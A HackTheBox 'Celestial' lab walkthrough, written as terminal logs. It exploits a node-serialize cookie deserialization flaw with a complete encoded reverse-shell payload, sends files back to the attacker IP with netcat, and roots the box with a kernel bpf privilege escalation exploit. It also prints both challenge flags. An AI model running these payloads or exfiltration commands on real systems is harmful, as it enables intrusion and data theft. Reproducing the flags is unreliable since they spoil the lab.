# Challenge Name: Celestial
**Website:** HackTheBox

**Walkthrough Available:** [N]

**Steps Taken:**
Identify host OS and IP
Connect to HTB Labs over VPN

Target IP: 10.10.10.85

1. Nmap Host

root@tater:~# nmap -sV 10.10.10.85
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-17 09:12 PDT
Nmap scan report for 10.10.10.85
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds

Port 3000/tcp Node.js is open. I ran a few more scans while looking up port 3000.
I wasn't finding anything on port 3000.  I searched with searchSpoit for vuls/exploits.

#more basic recon
root@tater:~/Downloads# wget https://10.10.10.85/
--2018-08-17 12:11:05--  https://10.10.10.85/
Connecting to 10.10.10.85:443... failed: Connection refused.
root@tater:~/Downloads# wget https://10.10.10.85:3000
--2018-08-17 12:11:17--  https://10.10.10.85:3000/
Connecting to 10.10.10.85:3000... connected.
GnuTLS: The TLS connection was non-properly terminated.
Unable to establish SSL connection.
root@tater:~/Downloads# wget https://10.10.10.85:3000/index.html
--2018-08-17 12:11:32--  https://10.10.10.85:3000/index.html
Connecting to 10.10.10.85:3000... connected.
GnuTLS: The TLS connection was non-properly terminated.
Unable to establish SSL connection.
root@tater:~/Downloads# curl https://10.10.10.85
curl: (7) Failed to connect to 10.10.10.85 port 443: Connection refused
root@tater:~/Downloads# curl https://10.10.10.85:3000
curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to 10.10.10.85:3000 

#didn't find anything of value other than Node.js. I looked for exploits in metasploit


root@tater:~# searchsploit 3000
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
8E6 R3000 Internet Filter 2.0.5.33 - U | exploits/hardware/remote/31031.txt
8E6 Technologies R3000 - Host Header I | exploits/multiple/remote/32167.txt
ABB MicroSCADA - 'wserver.exe' Remote  | exploits/windows/remote/30009.rb
AirMaster 3000M - Multiple Vulnerabili | exploits/hardware/webapps/42450.php
Apple Intel HD 3000 Graphics Driver 10 | exploits/osx/local/39675.c
Cacti 0.8.7 - 'data_input.php' Cross-S | exploits/php/webapps/33000.txt
Campsite 2.6.1 - '/implementation/Mana | exploits/php/webapps/30003.txt
Campsite 2.6.1 - '/implementation/Mana | exploits/php/webapps/30004.txt
Campsite 2.6.1 - 'LocalizerConfig.php? | exploits/php/webapps/30005.txt
Campsite 2.6.1 - 'LocalizerLanguage.ph | exploits/php/webapps/30006.txt
Cisco Prime Data Center Network Manage | exploits/java/remote/30008.rb
Cisco VPN 3000 Concentrator 4.1.7/4.7. | exploits/hardware/remote/2638.c
Cisco VPN 3000 Series Concentrator Cli | exploits/hardware/dos/21770.c
Grandstream GXV-3000 Phone - Remote De | exploits/hardware/dos/30517.pl
HERO SUPER PLAYER 3000 - '.m3u' Buffer | exploits/windows/dos/9677.c
HP-UX 10.x - rs.F3000 Unauthorized Acc | exploits/hp-ux/local/22248.sh
Joomla! / Mambo Component Download3000 | exploits/php/webapps/31530.txt
Joomla! Component AutoArticles 3000 -  | exploits/php/webapps/34972.txt
Joomla! Component d3000 1.0.0 - SQL In | exploits/php/webapps/5299.txt
Linksys X3000 1.0.03 build 001 - Multi | exploits/hardware/webapps/26415.txt
Microsoft Edge Chakra JIT - 'RegexHelp | exploits/windows/dos/43000.js
Microsoft VM 2000/3000/3100/3188/3200/ | exploits/windows/remote/21808.txt
Microsoft Virtual Machine 2000 - Serie | exploits/windows/remote/19734.java
Notepad++ Plugin Notepad 1.5 - Local O | exploits/windows/local/30007.txt
Pagetool CMS 1.07 - 'pt_upload.php' Re | exploits/php/webapps/3000.pl
Photo Transfer Wifi 1.4.4 iOS - Multip | exploits/ios/webapps/30000.txt
WordPress Plugin Formcraft - SQL Injec | exploits/php/webapps/30002.txt
Yokogawa CENTUM CS 3000 - 'BKBCopyD.ex | exploits/windows/remote/32210.rb
Yokogawa CENTUM CS 3000 - 'BKHOdeq.exe | exploits/windows/remote/32209.rb
Yokogawa CS3000 - 'BKESimmgr.exe' Remo | exploits/windows/remote/33331.rb
Yokogawa CS3000 - 'BKFSim_vhfd.exe' Re | exploits/windows/remote/34009.rb
ZipGenius 6.3.2.3000 - '.zip' Local Bu | exploits/windows/local/17511.pl
geeeekShop 1.4 - Information Disclosur | exploits/php/webapps/23000.txt
--------------------------------------- ----------------------------------------
Shellcodes: No Result

root@tater:~# searchsploit Node.js
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
Trend Micro - node.js HTTP Server List | exploits/windows/remote/39218.html
--------------------------------------- ----------------------------------------
Shellcodes: No Result

#The exploit available was for windows, but the server is a Linux Web Server.

[*] Starting the metasploit Framework console.../
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > 
msf > search Node.js
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                    Disclosure Date  Rank       Description
   ----                                                    ---------------  ----       -----------
   auxiliary/dos/http/nodejs_pipelining                    2013-10-18       normal     Node.js HTTP Pipelining Denial of Service
   exploit/multi/fileformat/nodejs_js_yaml_load_code_exec  2013-06-28       excellent  Nodejs js-yaml load() Code Execution

#The two exploits appear to be Windows. I decided to run Burp after some googleing to see if I could capture anything of value, or examine the node.js script
#In order to use burp, I need to change firefox to 127.0.0.1 
#After launching Firefox and using URL 10.10.10.85:3000 and recieved a cookie response


GET / HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

Connection: close

Upgrade-Insecure-Requests: 1

If-None-Match: W/"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg"

Cache-Control: max-age=0

#Burp; Decoder output

eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ
ZXlKMWMyVnlibUZ0WlNJNklrUjFiVzE1SWl3aVkyOTFiblJ5ZVNJNklrbGtheUJRY205aVlXSnNlU0JUYjIxbGQyaGxjbVVnUkhWdFlpSXNJbU5wZEhraU9pSk1ZVzFsZEc5M2JpSXNJbTUxYlNJNklqSWlmUSUzRCUzRA
#output demonstrates the cookie value is encoded in base64 
#The data below led me to believe I was on the right track

{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"fQ%3D%3D

#After some more googling on node.js, I came accross a deserialization attack
#Untrusted data is passed into the unserialize()function, which leads to we can bypass with a immediately invoked function expression IIFE of JavaScript objects to implement arbitrary code execution.

#**Steps apt-get install nodejs
root@tater:~/Downloads# apt-get install nodejs
Reading package lists... Done
Building dependency tree       
Reading state information... Done
nodejs is already the newest version (8.11.2~dfsg-1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

curl -L https://www.npmjs.com/install.sh | sh
root@tater:~/Downloads# curl -L https://www.npmjs.com/install.sh |sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5450  100  5450    0     0  36824      0 --:--:-- --:--:-- --:--:-- 36824
tar=/bin/tar
version:
tar (GNU tar) 1.30
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by John Gilmore and Jay Fenlason.
install npm@latest
fetching: https://registry.npmjs.org/npm/-/npm-6.4.0.tgz
npm ERR! path /tmp/npm.2314/package/npm-6.4.0.tgz
npm ERR! code ENOENT
npm ERR! errno -2
npm ERR! syscall stat
npm ERR! enoent ENOENT: no such file or directory, stat '/tmp/npm.2314/package/npm-6.4.0.tgz'
npm ERR! enoent This is related to npm not being able to find a file.
npm ERR! enoent 

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2018-08-17T19_26_53_091Z-debug.log
/usr/bin/npm -> /usr/lib/node_modules/npm/bin/npm-cli.js
/usr/bin/npx -> /usr/lib/node_modules/npm/bin/npx-cli.js
+ npm@6.4.0
updated 1 package in 7.624s
It worked

#install node-serialize: this app with let me re-serialize a payload

root@tater:~/Downloads# npm install node-serialize
npm WARN saveError ENOENT: no such file or directory, open '/root/Downloads/package.json'
npm WARN enoent ENOENT: no such file or directory, open '/root/Downloads/package.json'
npm WARN Downloads No description
npm WARN Downloads No repository field.
npm WARN Downloads No README data
npm WARN Downloads No license field.

+ node-serialize@0.0.4
updated 1 package and audited 1 package in 0.701s
found 1 critical severity vulnerability
  run `npm audit fix` to fix them, or `npm audit` for details
root@tater:~/Downloads# 

#The vulnerability in this vulnerable web application is that it 
#reads a cookie named profile from the HTTP request, 
#perform base64 decode of the cookie value and pass
# it to unserialize() function. As cookie is an untrusted input
#, an attacker can craft malicious cookie value to exploit 
#this vulnerability.

#I installed the Nodejs Security Toolkit 
git clone https://github.com/ajinabraham/Node.Js-Security-Course.git
#This allowed me to run nodejsshell.py on our IP

root@tater:~/Downloads# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.82.195  netmask 255.255.255.0  broadcast 192.168.82.255
        inet6 fe80::250:56ff:fe3e:a7e8  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:3e:a7:e8  txqueuelen 1000  (Ethernet)
        RX packets 6708  bytes 6995406 (6.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2567  bytes 290150 (283.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

var y = {
rce : function() {}
}
var serialize = require(‘node-serialize’);
console.log(“Serialized: \n” + serialize.serialize(y));lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 122  bytes 17696 (17.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 122  bytes 17696 (17.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.153  netmask 255.255.254.0  destination 10.10.15.153
        inet6 fe80::f281:e87e:7310:5b9b  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1197  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100

#now run the command to generate the shellcode using your IP from ifconfig:
root@tater:~/Downloads/Node.Js-Security-Course# python nodejsshell.py 10.10.15.153 666
[+] LHOST = 10.10.15.153
[+] LPORT = 666
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,53,51,34,59,10,80,79,82,84,61,34,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

Javascript payload: passes as a function
var y = {
rce : function() {INSERT REVERSE SHELL HERE}
}
var serialize = require(‘node-serialize’);
console.log(“Serialized: \n” + serialize.serialize(y));

#after inserting the payload, we need to serialize the code using the nodejs security course

root@tater:~/Downloads/Node.Js-Security-Course# node exploit.js
Serialized:
{"rce":"_$$ND_FUNC$$_function () {eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,53,51,34,59,10,80,79,82,84,61,34,54,54,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}"}

#now that we have the payload, it is time to reserialize and insert into the cookie
#copy and paste the serialized code into Burp:Decoder. encode as base64
#replay the get request and send the cookie to the repeater 
#paste in serialized code:

GET / HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge2V2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw0OSw0OCw0Niw0OSw1Myw0Niw0OSw1Myw1MSwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1NCw1NCw1NCwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQo=

Connection: close

Upgrade-Insecure-Requests: 1

If-None-Match: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"

Cache-Control: max-age=0

#start a netcat listener on my local system

root@tater:~/Downloads/Node.Js-Security-Course# nc -lvp 666
listening on [any] 666 ...

#Pressing go in Burp gave me a reverse shell with user/sun permissions by passing malicious code

root@tater:~/Downloads/Node.Js-Security-Course# nc -lvp 666
listening on [any] 666 ...
10.10.10.85: inverse host lookup failed: Unknown host
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.85] 35090
Connected!
ls
Desktop
Documents
Downloads
examples.desktop
gainz.py
LinEnum.sh
Music
node_modules
output.txt
Pictures
Public
server.js
Templates
Videos
ls

#Did not have a bash shell, so found these commands to generate a full bash shell
listening on [any] 666 ...
ls
10.10.10.85: inverse host lookup failed: Unknown host
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.85] 42188
Connected!
Desktop
Documents
Downloads
examples.desktop
Music
node_modules
output.txt
Pictures
Public
server.js
Templates
Videos
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
sun@sun:~$
# had user sun with user permissions.
sun@sun:~$ whoami
whoami
sun
sun@sun:~$ uname -a
#identified kernel version--this version is vulnerable to attack googling found 41050
uname -a
Linux sun 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
sun@sun:~$
sun@sun:~/Documents$ ls
ls
script.py  user.txt
sun@sun:~$ ls
ls
Desktop    Downloads         Music         output.txt  Public     Templates
Documents  examples.desktop  node_modules  Pictures    server.js  Videos
sun@sun:~$ nc -w 3 10.10.14.64 666 < output.txt
nc -w 3 10.10.14.64 666 < output.txt
sun@sun:~$ nc -w 3 10.10.14.64 666 < output.txt
nc -w 3 10.10.14.64 666 < output.txt
sun@sun:~$ nc -w 3 10.10.14.64 666 < server.js
nc -w 3 10.10.14.64 666 < server.js
sun@sun:~$ cd Desktop
cd Desktop
sun@sun:~/Desktop$ ls
ls
sun@sun:~/Desktop$ cd Downloads
cd Downloads
bash: cd: Downloads: No such file or directory
sun@sun:~/Desktop$ cd ../Downloads
cd ../Downloads
sun@sun:~/Downloads$ ls
ls
sun@sun:~/Downloads$ cd ../Documents
cd ../Documents
sun@sun:~/Documents$ ls
ls
python-shell-stageless-reverse-tcp-666.py    script.py
python-shell-stageless-reverse-tcp-666.py.1  user.txt
sun@sun:~/Documents$

#Found the first flag for User.txt


#found this exploit on exploit db
Linux Kernel < 4.13.9 (Ubuntu 16.04/Fedora 27) - Local Privilege Escalation
now need to copy up to the server

sun@sun:/tmp$ nc -l -p 1234 > 450102.c
nc -l -p 1234 > 450102.c
sun@sun:/tmp$ ls
ls
450102.c
asdf.py
config-err-N9seWN
systemd-private-1bcf24df775d45c2a099a3d59e6ba388-colord.service-PSae35
systemd-private-1bcf24df775d45c2a099a3d59e6ba388-rtkit-daemon.service-i72g3l
systemd-private-1bcf24df775d45c2a099a3d59e6ba388-systemd-timesyncd.service-nxFc9D
unity_support_test.1
vmware-root
sun@sun:/tmp$ gcc 450102.c -o con
gcc 450102.c -o con
sun@sun:/tmp$ chmod +x con
chmod +x con
sun@sun:/tmp$ sun@sun:/tmp$ gcc 450102.c -o con
gcc 450102.c -o con
sun@sun:/tmp$ chmod +x con
chmod +x con
sun@sun:/tmp$ ./con
./con
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88000e13f300
[*] Leaking sock struct from ffff88000e1563c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880038123b40
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880038123b40
[*] credentials patched, launching shell...
# whoami
whoami
root
# 

# find / -name 'root.txt'
find / -name 'root.txt'
find: ‘/run/user/1000/gvfs’: Permission denied
/root/root.txt
# cd /root/
cd /root/
# ls
ls
root.txt  script.py
# nc -w 3 10.10.14.64 1234 < root.txt
nc -w 3 10.10.14.64 1234 < root.txt
# 

Both flags:

root@tater:~/Downloads# cat root.txt
ba1d0019200a54e370ca151007a8095a
root@tater:~/Downloads# cat user.txt
9a093cd22ce86b7f41db4116e80d0b0f
root@tater:~/Downloads# 





